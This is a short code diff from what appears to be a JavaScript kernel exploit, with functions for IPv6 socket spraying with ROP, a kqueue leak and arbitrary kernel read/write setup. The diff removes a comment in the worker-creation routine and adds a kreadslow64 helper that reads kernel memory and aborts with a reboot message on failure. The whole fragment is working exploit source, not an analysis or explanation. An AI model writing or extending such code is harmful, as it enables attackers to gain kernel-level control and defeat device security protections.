@@ -879,10 +879,6 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
 function create_workers() {
   var sock_buf = malloc(8);
 
-  /* -------------------------
-   *  iov_recvmsg workers
-   * -------------------------
-   */
   for (var i = 0; i < IOV_THREAD_NUM; i++) {
     var ready = iov_thread_ready.add(8 * i);
     var done = iov_thread_done.add(8 * i);
@@ -1577,6 +1573,15 @@ function leak_kqueue() {
  *   Arbitrary Kernel R/W Setup
  * ===========================
  */
+
+function kreadslow64(address: BigInt) {
+  const buffer = kreadslow(address, 8)
+  if (buffer.eq(BigInt_Error)) {
+    cleanup()
+    throw new Error('Netctrl failed - Reboot and try again')
+  }
+  return read64(buffer)
+}
 
 function setup_arbitrary_rw() {
   var fd_files = kreadslow64(kq_fdp);
